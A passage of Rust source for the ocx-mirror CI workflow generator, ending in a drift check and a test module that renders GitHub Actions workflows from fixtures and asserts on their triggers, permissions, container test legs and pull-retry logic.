    let workflows_dir = repo_root.join(".github/workflows");
    let Ok(mut entries) = tokio::fs::read_dir(&workflows_dir).await else {
        return Vec::new();
    };

    let mut stale = Vec::new();
    while let Ok(Some(entry)) = entries.next_entry().await {
        let path = entry.path();
        if !path.extension().is_some_and(|ext| ext == "yml" || ext == "yaml") {
            continue;
        }
        let Ok(relative) = path.strip_prefix(repo_root) else {
            continue;
        };
        if files.contains_key(relative) {
            continue;
        }
        if tokio::fs::read_to_string(&path)
            .await
            .is_ok_and(|content| content.starts_with(GENERATED_HEADER))
        {
            stale.push(slash_path(relative));
        }
    }
    stale.sort();
    stale
}

/// Compare the expected generated files against what is on disk.
///
/// Returns `RendererDrift` if any file is missing, has different content — after
/// normalizing `uses:` action pins on both sides (see [`normalize_for_drift`]) —
/// or is a generated workflow no spec renders any more. Drift hints are
/// path-only — never expose file contents to stderr (secret-hygiene rule R3).
async fn check_drift(files: &BTreeMap<PathBuf, String>, repo_root: &Path) -> Result<(), MirrorError> {
    let mut drifted: Vec<String> = Vec::new();

    for (relative_path, expected) in files {
        let on_disk_path = repo_root.join(relative_path);
        match tokio::fs::read_to_string(&on_disk_path).await {
            Ok(actual) => {
                if normalize_for_drift(&actual) != normalize_for_drift(expected) {
                    // Emit path-only hint; content never printed (R3).
                    eprintln!("drift: {}", relative_path.display());
                    drifted.push(relative_path.display().to_string());
                }
            }
            Err(_) => {
                // Missing file counts as drift.
                eprintln!("drift: {}", relative_path.display());
                drifted.push(relative_path.display().to_string());
            }
        }
    }

    for path in stale_generated(files, repo_root).await {
        eprintln!("stale: {path}");
        drifted.push(path);
    }

    if drifted.is_empty() {
        Ok(())
    } else {
        Err(MirrorError::RendererDrift(drifted))
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use std::path::Path;
    use tempfile::tempdir;

    use super::*;

    // ── §3.3 S3: Golden tests for ocx-mirror generate ci ──────────────────

    /// Copy a fixture into `work_dir` at `relative`, creating parents.
    fn install_spec_at(fixture_name: &str, work_dir: &Path, relative: &str) -> PathBuf {
        let fixture_src = Path::new(concat!(env!("CARGO_MANIFEST_DIR"), "/tests/fixtures/")).join(fixture_name);
        let spec_dest = work_dir.join(relative);
        std::fs::create_dir_all(spec_dest.parent().unwrap()).unwrap();
        std::fs::copy(&fixture_src, &spec_dest).expect("failed to copy fixture into work_dir");
        spec_dest
    }

    /// Copy a fixture into `work_dir` as the repository's root `mirror.yml`.
    ///
    /// That is the layout every published mirror repository has, and the one
    /// the goldens are pinned to: a repo-root `mirror.yml` is the single spec
    /// path the generated invocations may leave unsaid.
    fn install_spec(fixture_name: &str, work_dir: &Path) -> PathBuf {
        install_spec_at(fixture_name, work_dir, "mirror.yml")
    }

    /// Run `generate ci` over `specs` with `repo_root` as the repository root.
    fn generate(repo_root: &Path, specs: &[PathBuf], check: bool) -> Result<(), MirrorError> {
        let cmd = GenerateCi {
            spec: specs.to_vec(),
            repo_root: Some(repo_root.to_path_buf()),
            check,
            format: None,
        };
        let rt = tokio::runtime::Runtime::new().unwrap();
        let printer = ocx_lib::cli::DataInterface::new(ocx_lib::cli::Printer::new(false, false));
        rt.block_on(async { cmd.execute(&printer).await })
    }

    /// Install a fixture as `work_dir/mirror.yml` and render it there.
    ///
    /// Returns `Err(MirrorError)` if the renderer rejects the spec.
    fn render_fixture(fixture_name: &str, work_dir: &Path) -> Result<(), MirrorError> {
        let spec = install_spec(fixture_name, work_dir);
        // The one `script:` in the fixture corpus. `script:` resolves from the
        // repository root and must exist, so the repository has to hold it.
        write_file(work_dir, "tests/smoke.star", "ocx_assert(True)\n");
        generate(work_dir, &[spec], false)
    }

    /// The slot a spec at `relative` occupies, extending nothing.
    fn slot_at(relative: &str) -> SpecSlot {
        SpecSlot {
            relative: PathBuf::from(relative),
            extends: Vec::new(),
        }
    }

    /// The slot a single-spec repository's root `mirror.yml` occupies.
    fn root_slot() -> SpecSlot {
        slot_at(DEFAULT_SPEC_NAME)
    }

    /// Render `mirror.yml` for an inline spec at the repository root.
    fn workflow_of(yaml: &str) -> String {
        render_workflow(&spec_from_yaml(yaml), &root_slot())
    }

    /// Render `describe.yml` for an inline spec at the repository root.
    fn describe_of(yaml: &str) -> String {
        render_describe(&spec_from_yaml(yaml), &root_slot())
    }

    #[test]
    fn render_minimal_spec_writes_workflow() {
        // §3.3: Fixture mirror-minimal.yml → renderer produces workflow YAML.
        let dir = tempdir().unwrap();
        let result = render_fixture("mirror-minimal.yml", dir.path());
        match result {
            Ok(()) => {
                let workflow = dir.path().join(".github/workflows/mirror.yml");
                assert!(workflow.exists(), "Expected .github/workflows/mirror.yml to be written");
                let content = std::fs::read_to_string(&workflow).unwrap();
                // Generated file must have the DO-NOT-EDIT header
                assert!(
                    content.contains("DO NOT EDIT"),
                    "Generated workflow must contain 'DO NOT EDIT' header"
                );
                // Must install ocx via the setup-ocx action (replaces the old
                // submodule + `cargo install` pair)
                assert!(
                    content.contains("uses: ocx-sh/setup-ocx@"),
                    "Generated workflow must install ocx via the setup-ocx action"
                );
                // Pipeline subcommands are invoked directly — setup-ocx has
                // already activated the project toolchain onto PATH for the step.
                assert!(
                    content.contains("ocx-mirror package pipeline plan"),
                    "Generated workflow must invoke ocx-mirror directly (no `ocx run --` wrapper)"
                );
                // Lock the toolchain-sourcing model: no step wraps a tool in
                // `ocx run --` (that would pin the bootstrap ocx, breaking the
                // nested `ocx package push` resolution).
                assert!(
                    !content.contains("ocx run -- "),
                    "Generated workflow must not wrap tools in `ocx run --`; content:\n{content}"
                );
            }
            Err(MirrorError::SpecUsageError(_)) => {
                panic!("mirror-minimal.yml should be a valid spec, got SpecUsageError");
            }
            Err(e) => {
                panic!("Unexpected error rendering minimal fixture: {e}");
            }
        }
    }

    // ── Container test legs ───────────────────────────────────────────────

    /// Render a fixture and return the generated `mirror.yml` content.
    fn workflow_for(fixture: &str) -> String {
        let dir = tempdir().unwrap();
        render_fixture(fixture, dir.path()).unwrap_or_else(|e| panic!("{fixture} must render: {e}"));
        std::fs::read_to_string(dir.path().join(".github/workflows/mirror.yml")).unwrap()
    }

    #[test]
    fn container_matrix_entries_stay_valid_yaml() {
        // Container mode is the only path that emits extra matrix keys, so it is
        // the only path that can break the hand-built indentation of the
        // `include:` block. A string assertion cannot see that; parsing can.
        for fixture in [
            "mirror-multi-container.yml",
            "mirror-container-mixed.yml",
            "mirror-container-libc.yml",
            "mirror-container-setup.yml",
        ] {
            let workflow = workflow_for(fixture);
            let parsed: serde_yaml_ng::Value = serde_yaml_ng::from_str(&workflow)
                .unwrap_or_else(|e| panic!("{fixture} must render parseable YAML: {e}\n{workflow}"));

            let legs = parsed["jobs"]["test"]["strategy"]["matrix"]["include"]
                .as_sequence()
                .unwrap_or_else(|| panic!("{fixture}: test matrix must be a sequence"));
            // Every container leg must carry both keys the run step reads; a leg
            // with an image but no libc would build a bogus ocx triple.
            let with_image = legs
                .iter()
                .filter(|leg| leg.get("container_image").is_some())
                .inspect(|leg| {
                    assert!(
                        leg.get("container_libc").is_some(),
                        "{fixture}: a leg with container_image must also carry container_libc"
                    );
                })
                .count();
            assert!(with_image > 0, "{fixture} must render container legs");
        }
    }

    #[test]
    fn container_setup_builds_the_image_once_per_leg() {
        let workflow = workflow_for("mirror-container-setup.yml");

        for needle in [
            // The Dockerfile crosses into the shell through `env:`, never as an
            // inline expression — that is what makes quotes and newlines safe.
            "OCX_CONTAINER_DOCKERFILE: ${{ matrix.container_dockerfile }}",
            // Once per leg, not once per version: every version after the first
            // finds the tag already built.
            r#"if ! docker image inspect "${OCX_SETUP_TAG}" >/dev/null 2>&1; then"#,
            r#"| docker build --platform "${{ matrix.docker_platform }}" -t "${OCX_SETUP_TAG}" - \"#,
            // Without this the provisioned image is built and then ignored.
            r#"CONTAINER_IMAGE="${OCX_SETUP_TAG}""#,
            // A failing setup command must name itself in the run summary; a
            // bare non-zero `docker build` reads as a renderer bug.
            "::error::container setup failed for",
        ] {
            assert!(
                workflow.contains(needle),
                "a setup-declaring spec must render `{needle}`, got:\n{workflow}"
            );
        }
    }

    #[test]
    fn the_container_image_is_pulled_with_retries_before_anything_runs_it() {
        // Left to `docker run`, a rate-limited pull surfaces in the JUnit report
        // as a failed testcase — the one thing a red testcase must not be able
        // to mean. Pulling up front makes it a failed step instead. The setup
        // fixture renders both consumers of the image (`docker build`'s FROM and
        // `docker run`), so it is the one that can prove the ordering.
        let workflow = workflow_for("mirror-container-setup.yml");

        let pull = r#"until docker pull --platform "${{ matrix.docker_platform }}" "${CONTAINER_IMAGE}"; do"#;
        let pull_at = workflow.find(pull).unwrap_or_else(|| {
            panic!("container legs must pull the image explicitly with the docker platform, got:\n{workflow}")
        });

        // A bare pull would only move the flake, so assert the whole loop: the
        // once-per-leg guard (without it every version spends a manifest
        // request — the resource being rate-limited), five attempts, doubling
        // delay, and a hard exit once they are spent.
        for needle in [
            r#"if ! docker image inspect "${CONTAINER_IMAGE}" >/dev/null 2>&1; then"#,
            "OCX_PULL_DELAY=2",
            r#"if [ "${OCX_PULL_ATTEMPT}" -ge 5 ]; then"#,
            r#"sleep "${OCX_PULL_DELAY}""#,
            "OCX_PULL_DELAY=$((OCX_PULL_DELAY * 2))",
            "::error::could not pull ${CONTAINER_IMAGE}",
        ] {
            assert!(
                workflow.contains(needle),
                "the pull must retry with backoff and fail the job when spent — missing `{needle}`, got:\n{workflow}"
            );
        }

        // Both consumers go to the network on a cache miss, so both must come
        // after the pull — otherwise the retry protects nothing.
        for consumer in ["docker build --platform", "docker run --rm -i --platform"] {
            let consumer_at = workflow
                .find(consumer)
                .unwrap_or_else(|| panic!("the setup fixture must render `{consumer}`, got:\n{workflow}"));
            assert!(
                pull_at < consumer_at,
                "the retrying pull must precede `{consumer}`, got:\n{workflow}"
            );
        }
    }

    #[test]
    fn container_setup_matrix_entries_stay_valid_yaml() {
        // Asserting the parsed value, not the rendered text: it is the only way
        // to prove the block scalar's indentation, the honoured shell, the
        // one-RUN-per-command shape and the survival of both quote flavours in
        // a single check — and each of those is a way to emit a broken image.
        let workflow = workflow_for("mirror-container-setup.yml");
        let parsed: serde_yaml_ng::Value = serde_yaml_ng::from_str(&workflow)
            .unwrap_or_else(|e| panic!("setup fixture must render parseable YAML: {e}\n{workflow}"));
        let legs = parsed["jobs"]["test"]["strategy"]["matrix"]["include"]
            .as_sequence()
            .expect("test matrix must be a sequence");
        let leg = |id: &str| {
            legs.iter()
                .find(|leg| leg["container_id"].as_str() == Some(id))
                .unwrap_or_else(|| panic!("no leg with container_id {id}"))
        };

        assert_eq!(
            leg("alpine_3_20")["container_dockerfile"].as_str(),
            Some("FROM alpine:3.20\nSHELL [\"sh\", \"-c\"]\nRUN apk add --no-cache libstdc++\n"),
        );
        assert_eq!(
            leg("ubuntu_24_04")["container_dockerfile"].as_str(),
            Some(concat!(
                "FROM ubuntu:24.04\n",
                "SHELL [\"bash\", \"-c\"]\n",
                "RUN apt-get update && apt-get install -y --no-install-recommends libatomic1\n",
                "RUN sh -c 'echo \"provisioned\" > /etc/ocx-setup-marker'\n",
            )),
        );
        // Same platform, no `setup:` — the key set stays what it was.
        assert!(
            leg("fedora_40").get("container_dockerfile").is_none(),
            "a container without setup must not gain a container_dockerfile key",
        );
    }

    #[test]
    fn a_container_spec_without_setup_emits_no_setup_machinery() {
        // The container half of the byte-identical proof (the golden corpus is
        // the native half): container mode predates `setup:`, so a spec that
        // declares none must render exactly what it rendered before.
        let workflow = workflow_for("mirror-multi-container.yml");

        for needle in [
            "container_dockerfile",
            "OCX_CONTAINER_DOCKERFILE",
            "docker build",
            "ocx-mirror-setup",
        ] {
            assert!(
                !workflow.contains(needle),
                "a spec without setup must not render `{needle}`, got:\n{workflow}"
            );
        }
    }

    /// Render a fixture and parse one of its generated workflows.
    fn parse_workflow(fixture: &str, name: &str) -> serde_yaml_ng::Value {
        let dir = tempdir().unwrap();
        render_fixture(fixture, dir.path()).unwrap_or_else(|e| panic!("{fixture} must render: {e}"));
        let rendered = std::fs::read_to_string(dir.path().join(".github/workflows").join(name)).unwrap();
        serde_yaml_ng::from_str(&rendered).unwrap_or_else(|e| panic!("{name} must be parseable YAML: {e}\n{rendered}"))
    }

    #[test]
    fn patch_is_dispatch_only_and_exposes_the_whole_selection_surface() {
        // Patching re-emits published manifests, so anything but an explicit
        // human dispatch — a schedule, a push, a wire to `plan`'s has_drift —
        // would republish the corpus on somebody else's timetable.
        let parsed = parse_workflow("mirror-ghcr-announce.yml", "patch.yml");

        let triggers = &parsed["on"];
        assert_eq!(
            triggers
                .as_mapping()
                .unwrap_or_else(|| panic!("triggers must be a mapping, got: {triggers:?}"))
                .keys()
                .map(|k| k.as_str().unwrap())
                .collect::<Vec<_>>(),
            vec!["workflow_dispatch"],
            "patch must be dispatch-only — no push, no schedule",
        );

        // The command's selection surface is these three flags; an input the
        // workflow does not expose is a patch a maintainer can only run from a
        // laptop, which is the gap this workflow closes.
        let inputs = &triggers["workflow_dispatch"]["inputs"];
        assert_eq!(
            inputs
                .as_mapping()
                .unwrap_or_else(|| panic!("inputs must be a mapping, got: {inputs:?}"))
                .keys()
                .map(|k| k.as_str().unwrap())
                .collect::<Vec<_>>(),
            vec!["version", "min_version", "max_version"],
        );

        // Naming any permission sets every unnamed one to `none`, so this map is
        // the job's whole token. `packages: write` re-emits the manifests;
        // `contents: read` is checkout + setup-ocx. The push job's `actions`,
        // `checks` and `pull-requests` scopes buy steps this job does not run.
        let permissions = &parsed["jobs"]["patch"]["permissions"];
        assert_eq!(
            permissions
                .as_mapping()
                .unwrap_or_else(|| panic!("a ghcr patch job must name its permissions, got: {permissions:?}"))
                .iter()
                .map(|(k, v)| (k.as_str().unwrap(), v.as_str().unwrap()))
                .collect::<Vec<_>>(),
            vec![("contents", "read"), ("packages", "write")],
        );

        // A successful patch chains into announce, which authenticates against
        // the index repository with this secret and nothing else.
        assert_eq!(
            patch_step(&parsed)["env"]["OCX_ANNOUNCE_TOKEN"].as_str(),
            Some("${{ secrets.OCX_ANNOUNCE_TOKEN }}"),
        );
    }

    /// The `patch.yml` step that runs the command.
    fn patch_step(parsed: &serde_yaml_ng::Value) -> &serde_yaml_ng::Value {
        parsed["jobs"]["patch"]["steps"]
            .as_sequence()
            .expect("patch job must have steps")
            .iter()
            .find(|step| step.get("env").is_some())
            .expect("one step must carry the patch environment")
    }

    /// Run `patch.yml`'s command step against a stub `ocx-mirror`, returning the
    /// argv it was invoked with.
    ///
    /// The step body carries no `${{ }}` — every dispatch input reaches it
    /// through `env:` — so it is the actual shell GitHub would run, not a
    /// paraphrase of it. Asserting on the script text instead would only prove
    /// the template says what the template says.
    fn patch_argv(inputs: &[(&str, &str)]) -> Vec<String> {
        let parsed = parse_workflow("mirror-ghcr-announce.yml", "patch.yml");
        let script = patch_step(&parsed)["run"]
            .as_str()
            .expect("the step must carry a run block");

        let dir = tempdir().unwrap();
        let argv_file = dir.path().join("argv");
        let stub = dir.path().join("ocx-mirror");
        std::fs::write(
            &stub,
            format!(
                "#!/usr/bin/env bash\nfor arg in \"$@\"; do printf '%s\\n' \"${{arg}}\" >> {}; done\n",
                argv_file.display()
            ),
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&stub, std::fs::Permissions::from_mode(0o755)).unwrap();
        }

        let script_path = dir.path().join("step.sh");
        std::fs::write(&script_path, script).unwrap();

        let mut command = std::process::Command::new("bash");
        command
            .arg(&script_path)
            .current_dir(dir.path())
            .env(
                "PATH",
                format!("{}:{}", dir.path().display(), std::env::var("PATH").unwrap()),
            )
            // GitHub always sets a dispatch input's env var; an omitted input
            // arrives as the empty string, never as an absent variable.
            .env("VERSIONS", "")
            .env("MIN_VERSION", "")
            .env("MAX_VERSION", "");
        for (key, value) in inputs {
            command.env(key, value);
        }

        let output = command.output().expect("the step script must run under bash");
        assert!(
            output.status.success(),
            "the step script exited {}: {}",
            output.status,
            String::from_utf8_lossy(&output.stderr),
        );
        std::fs::read_to_string(&argv_file)
            .unwrap_or_default()
            .lines()
            .map(str::to_string)
            .collect()
    }

    #[test]
    fn an_empty_patch_dispatch_names_no_selection_at_all() {
        // The documented default is "patch everything published", and it is
        // reached by passing no selection flag. A `--min-version ""` emitted for
        // an omitted input would silently narrow the run instead — a maintainer
        // who dispatched with empty fields would get a subset and no sign of it.
        assert_eq!(patch_argv(&[]), vec!["package", "pipeline", "patch", "--metadata-only"],);
    }

    #[test]
    fn patch_dispatch_inputs_become_the_command_line_selection() {
        // `--version` repeats on the CLI but a dispatch input is one string, so
        // the step splits it. Both separators, and a run of them, resolve to one
        // flag per version; the bounds pass through as themselves.
        assert_eq!(
            patch_argv(&[
                ("VERSIONS", "3.29.0, 3.28.0 3.27.0"),
                ("MIN_VERSION", "3.0.0"),
                ("MAX_VERSION", "4.0.0"),
            ]),
            vec![
                "package",
                "pipeline",
                "patch",
                "--metadata-only",
                "--version",
                "3.29.0",
                "--version",
                "3.28.0",
                "--version",
                "3.27.0",
                "--min-version",
                "3.0.0",
                "--max-version",
                "4.0.0",
            ],
        );

        // A bound on its own must not drag an empty `--version` along with it.
        assert_eq!(
            patch_argv(&[("MIN_VERSION", "3.0.0")]),
            vec![
                "package",
                "pipeline",
                "patch",
                "--metadata-only",
                "--min-version",
                "3.0.0"
            ],
        );
    }

    #[test]
    fn announce_from_registry_is_dispatch_only_by_default_and_carries_the_token() {
        // The Python acceptance test only text-greps `"on:"` (the locked test
        // env has no yaml module), so the real parse lives here. A push trigger
        // on this workflow would open an index pull request on every commit —
        // the one thing it must never do. A schedule is opt-in per spec, so a
        // spec that did not ask for one gets neither.
        let dir = tempdir().unwrap();
        render_fixture("mirror-ghcr-announce.yml", dir.path()).expect("announce fixture must render");
        let rendered =
            std::fs::read_to_string(dir.path().join(".github/workflows/announce-from-registry.yml")).unwrap();

        let parsed: serde_yaml_ng::Value = serde_yaml_ng::from_str(&rendered)
            .unwrap_or_else(|e| panic!("announce-from-registry.yml must be parseable YAML: {e}\n{rendered}"));

        let triggers = &parsed["on"];
        let mapping = triggers
            .as_mapping()
            .unwrap_or_else(|| panic!("triggers must be a mapping, got: {triggers:?}"));
        assert_eq!(
            mapping.keys().map(|k| k.as_str().unwrap()).collect::<Vec<_>>(),
            vec!["workflow_dispatch"],
            "a spec that named no announce schedule must get a dispatch-only workflow — and never a push trigger",
        );

        let dry_run = &triggers["workflow_dispatch"]["inputs"]["dry_run"];
        assert_eq!(dry_run["type"].as_str(), Some("boolean"), "got: {dry_run:?}");
        assert_eq!(dry_run["default"].as_bool(), Some(true), "got: {dry_run:?}");

        // The announce cannot open a pull request without the secret, so an
        // env: block that lost it would turn every dispatch into an auth error.
        let step = parsed["jobs"]["announce"]["steps"]
            .as_sequence()
            .expect("announce job must have steps")
            .iter()
            .find(|step| step.get("env").is_some())
            .expect("one step must carry the announce environment");
        assert_eq!(
            step["env"]["OCX_ANNOUNCE_TOKEN"].as_str(),
            Some("${{ secrets.OCX_ANNOUNCE_TOKEN }}"),
            "got: {step:?}",
        );
    }

    /// Parse one spec's rendered `announce-from-registry.yml`, from an inline
    /// spec at the root.
    fn announce_from_registry_of(yaml: &str) -> serde_yaml_ng::Value {
        let rendered = render_announce_from_registry(&spec_from_yaml(yaml), &root_slot());
        serde_yaml_ng::from_str(&rendered)
            .unwrap_or_else(|e| panic!("announce-from-registry.yml must be parseable YAML: {e}\n{rendered}"))
    }

    /// `SHFMT_SPEC` with an `announce:` block, optionally on a timer.
    fn shfmt_announcing(schedule: Option<&str>) -> String {
        let cron = schedule
            .map(|cron| format!("  schedule: \"{cron}\"\n"))
            .unwrap_or_default();
        format!("{SHFMT_SPEC}announce:\n  package: mvdan/shfmt\n  fork: ocx-contrib/index\n{cron}")
    }

    /// The keys of a rendered workflow's `on:` block, in order.
    fn trigger_keys(parsed: &serde_yaml_ng::Value) -> Vec<&str> {
        parsed["on"]
            .as_mapping()
            .unwrap_or_else(|| panic!("triggers must be a mapping, got: {:?}", parsed["on"]))
            .keys()
            .map(|key| key.as_str().expect("a trigger key is a string"))
            .collect()
    }

    #[test]
    fn an_announce_schedule_adds_a_cron_trigger_beside_the_dispatch() {
        // The opt-in half: an operator who wants the catch-up unattended gets a
        // timer, and keeps the manual dispatch they had.
        let parsed = announce_from_registry_of(&shfmt_announcing(Some("23 5 * * 2")));
        assert_eq!(
            trigger_keys(&parsed),
            vec!["schedule", "workflow_dispatch"],
            "a schedule is added to the dispatch, never a push trigger and never instead of it",
        );
        assert_eq!(
            parsed["on"]["schedule"][0]["cron"].as_str(),
            Some("23 5 * * 2"),
            "got: {:?}",
            parsed["on"]["schedule"],
        );

        // Two separate opt-ins on two separate workflows: an operator who wants
        // unattended announces has not asked for unattended tag repair, and the
        // shared `schedule_block` helper makes crossing them a one-line typo.
        assert_eq!(
            trigger_keys(&cascade_of(&shfmt_announcing(Some("23 5 * * 2")))),
            vec!["workflow_dispatch"],
            "announce.schedule must not put the repair workflow on a timer",
        );
        assert_eq!(
            trigger_keys(&announce_from_registry_of(&format!(
                "{}cascade:\n  schedule: \"17 4 * * 1\"\n",
                shfmt_announcing(None)
            ))),
            vec!["workflow_dispatch"],
            "cascade.schedule must not put the announce workflow on a timer",
        );
    }

    #[test]
    fn the_announce_step_answers_dry_run_for_a_scheduled_event() {
        // `inputs.dry_run` is empty outside a dispatch. Left alone it reads as
        // "not true", which is the right answer by accident — one that a
        // default flip would silently invert.
        let step = announce_from_registry_of(&shfmt_announcing(None))["jobs"]["announce"]["steps"]
            .as_sequence()
            .expect("announce job must have steps")
            .iter()
            .find(|step| step["name"].as_str() == Some("Announce every registry tag into the index"))
            .expect("the announce step must be named")
            .clone();
        assert_eq!(
            step["env"]["DRY_RUN"].as_str(),
            Some("${{ github.event_name == 'schedule' && 'false' || inputs.dry_run }}"),
            "got: {step:?}",
        );
    }

    #[test]
    fn cascade_workflow_is_dispatch_only_by_default_and_carries_the_token() {
        // A push trigger here would re-point published rolling tags on every
        // commit, which is the one thing a repair must never do. A schedule is
        // opt-in per spec, so a spec that did not ask for one gets neither.
        // `dry_run` defaulting to true is the other half: a dispatch that names
        // nothing audits.
        let dir = tempdir().unwrap();
        render_fixture("mirror-ghcr-announce.yml", dir.path()).expect("announce fixture must render");
        let rendered = std::fs::read_to_string(dir.path().join(".github/workflows/cascade.yml")).unwrap();

        let parsed: serde_yaml_ng::Value = serde_yaml_ng::from_str(&rendered)
            .unwrap_or_else(|e| panic!("cascade.yml must be parseable YAML: {e}\n{rendered}"));

        let triggers = &parsed["on"];
        let mapping = triggers
            .as_mapping()
            .unwrap_or_else(|| panic!("triggers must be a mapping, got: {triggers:?}"));
        assert_eq!(
            mapping.keys().map(|k| k.as_str().unwrap()).collect::<Vec<_>>(),
            vec!["workflow_dispatch"],
            "a spec that named no schedule must get a dispatch-only cascade — and never a push trigger",
        );

        let dry_run = &triggers["workflow_dispatch"]["inputs"]["dry_run"];
        assert_eq!(dry_run["type"].as_str(), Some("boolean"), "got: {dry_run:?}");
        assert_eq!(dry_run["default"].as_bool(), Some(true), "got: {dry_run:?}");

        // A repaired alias points at a digest the index does not know, so the
        // run ends by announcing — an env: block that lost the secret would
        // degrade every repair to a silent notice.
        let step = parsed["jobs"]["cascade"]["steps"]
            .as_sequence()
            .expect("cascade job must have steps")
            .iter()
            .find(|step| step.get("env").is_some())
            .expect("one step must carry the announce environment");
        assert_eq!(
            step["env"]["OCX_ANNOUNCE_TOKEN"].as_str(),
            Some("${{ secrets.OCX_ANNOUNCE_TOKEN }}"),
            "got: {step:?}",
        );

        // The repair writes tags to the target repository — the read scope
        // discover gets would 403 the moment it moved one.
        assert!(
            rendered.contains("      packages: write\n"),
            "a ghcr target's repair needs packages: write, got:\n{rendered}"
        );
    }

    #[test]
    fn cascade_workflow_follows_the_spec_flag() {
        // No cascade, no rolling alias, nothing to repair — and a workflow that
        // dispatched anyway would report findings on a graph the spec never
        // asked for.
        let cascading = render_spec(&spec_from_yaml(SHFMT_SPEC), &root_slot());
        assert!(
            cascading.contains_key(Path::new(".github/workflows/cascade.yml")),
            "cascade defaults to true, so the workflow is emitted by default"
        );

        let plain = render_spec(&spec_from_yaml(&format!("{SHFMT_SPEC}cascade: false\n")), &root_slot());
        assert!(
            !plain.contains_key(Path::new(".github/workflows/cascade.yml")),
            "a spec that publishes no rolling tag must not get a repair workflow"
        );

        // The map form is an enabled cascade with a trigger attached, so it
        // emits the same workflow the bare `true` does.
        let scheduled = render_spec(
            &spec_from_yaml(&format!("{SHFMT_SPEC}cascade:\n  schedule: \"17 4 * * 1\"\n")),
            &root_slot(),
        );
        assert!(
            scheduled.contains_key(Path::new(".github/workflows/cascade.yml")),
            "a spec naming a cascade schedule is a cascading spec"
        );
    }

    /// Parse one spec's rendered `cascade.yml`, from an inline spec at the root.
    fn cascade_of(yaml: &str) -> serde_yaml_ng::Value {
        let rendered = render_cascade(&spec_from_yaml(yaml), &root_slot());
        serde_yaml_ng::from_str(&rendered)
            .unwrap_or_else(|e| panic!("cascade.yml must be parseable YAML: {e}\n{rendered}"))
    }

    #[test]
    fn a_cascade_schedule_adds_a_cron_trigger_beside_the_dispatch() {
        // The opt-in half: an operator who wants unattended repair gets a
        // timer, and keeps the manual dispatch they had.
        let parsed = cascade_of(&format!("{SHFMT_SPEC}cascade:\n  schedule: \"17 4 * * 1\"\n"));

        let triggers = parsed["on"]
            .as_mapping()
            .unwrap_or_else(|| panic!("triggers must be a mapping, got: {:?}", parsed["on"]));
        assert_eq!(
            triggers.keys().map(|k| k.as_str().unwrap()).collect::<Vec<_>>(),
            vec!["schedule", "workflow_dispatch"],
            "a schedule is added to the dispatch, never a push trigger and never instead of it",
        );
        assert_eq!(
            parsed["on"]["schedule"][0]["cron"].as_str(),
            Some("17 4 * * 1"),
            "got: {:?}",
            parsed["on"]["schedule"],
        );
    }

    #[test]
    fn the_repair_step_answers_dry_run_for_a_scheduled_event() {
        // `inputs.dry_run` is empty outside a dispatch. Left alone it reads as
        // "not true", which is the right answer by accident — one that a
        // default flip would silently invert.
        let step = cascade_of(SHFMT_SPEC)["jobs"]["cascade"]["steps"]
            .as_sequence()
            .expect("cascade job must have steps")
            .iter()
            .find(|step| step["name"].as_str() == Some("Repair the rolling-tag cascade"))
            .expect("the repair step must be named")
            .clone();
        assert_eq!(
            step["env"]["DRY_RUN"].as_str(),
            Some("${{ github.event_name == 'schedule' && 'false' || inputs.dry_run }}"),
            "got: {step:?}",
        );
    }

    #[test]
    fn cascade_queues_behind_its_own_specs_publish_workflow() {
        // A repair and a live push both re-point the same rolling aliases, so
        // the two must not interleave. The cascade workflow has no runtime
        // handle on the push workflow's name, so its group is a baked literal —
        // derive both ends from one render or it drifts unnoticed.
        let nested = SHFMT_SPEC.replace("name: shfmt", "name: shfmt-py3.13");
        let files = render(&[
            (root_slot(), spec_from_yaml(SHFMT_SPEC)),
            (slot_at("py3.13/mirror.yml"), spec_from_yaml(&nested)),
        ]);

        let parse = |relative: String| -> serde_yaml_ng::Value {
            let rendered = &files[Path::new(&relative)];
            serde_yaml_ng::from_str(rendered).unwrap_or_else(|e| panic!("{relative} must parse: {e}\n{rendered}"))
        };

        let mut groups = Vec::new();
        for suffix in ["", "-py3.13"] {
            let push = parse(format!(".github/workflows/mirror{suffix}.yml"));
            let cascade = parse(format!(".github/workflows/cascade{suffix}.yml"));

            assert_eq!(
                push["concurrency"]["group"].as_str(),
                Some("mirror-${{ github.workflow }}-publish"),
                "the literal baked into cascade{suffix}.yml is only correct while the push group reads this way",
            );
            let name = push["name"].as_str().expect("the push workflow must be named");
            let group = cascade["concurrency"]["group"]
                .as_str()
                .unwrap_or_else(|| panic!("cascade{suffix}.yml must name a concurrency group"));
            assert_eq!(
                group,
                format!("mirror-{name}-publish"),
                "cascade{suffix}.yml must queue behind the workflow named {name}",
            );
            assert_eq!(
                cascade["concurrency"]["cancel-in-progress"].as_bool(),
                Some(false),
                "a repair cancelled mid-flight leaves the graph it was fixing half-written",
            );
            groups.push(group.to_string());
        }
        assert_ne!(
            groups[0], groups[1],
            "a nested spec must join its own publish group, not the root spec's",
        );
    }

    #[test]
    fn container_legs_execute_the_artifact_inside_the_image() {
        // The gate this feature exists for: an `os.features` musl/glibc claim is
        // only verified when the mirrored binary is executed by that image's
        // loader. A matrix that merely names images proves nothing, so assert
        // the wrapper actually runs `ocx package test` inside `docker run`.
        let workflow = workflow_for("mirror-multi-container.yml");

        assert!(
            workflow.contains("docker run --rm -i --platform \"${{ matrix.docker_platform }}\" \\"),
            "container legs must invoke docker run, got:\n{workflow}"
        );
        assert!(
            workflow.contains("\"${CONTAINER_IMAGE}\" ocx \"$@\""),
            "docker run must exec ocx inside the image, got:\n{workflow}"
        );
        // Every test kind routes through the wrapper, not the runner's ocx.
        assert_eq!(
            workflow.matches("ocx_test package test --platform").count(),
            3,
            "all three test kinds must run through the container wrapper, got:\n{workflow}"
        );
        assert!(
            !workflow.contains(" ocx package test --platform"),
            "no test may bypass the wrapper onto the runner's ocx, got:\n{workflow}"
        );
        // The workspace must be mounted at its own path, or the bundle and its
        // `-metadata.json` sibling resolve to nothing inside the container.
        assert!(
            workflow.contains("-v \"${GITHUB_WORKSPACE}:${GITHUB_WORKSPACE}\" -w \"${GITHUB_WORKSPACE}\""),
            "workspace must be mounted at its own path, got:\n{workflow}"
        );
        assert!(
            workflow.contains("-v \"${OCX_CONTAINER_BIN}:/usr/local/bin/ocx:ro\""),
            "the libc-matched ocx must be mounted into the image, got:\n{workflow}"
        );
    }

    #[test]
    fn container_legs_fetch_a_libc_matched_ocx_per_architecture() {
        // The static ocx is what runs inside the image; a gnu build on Alpine
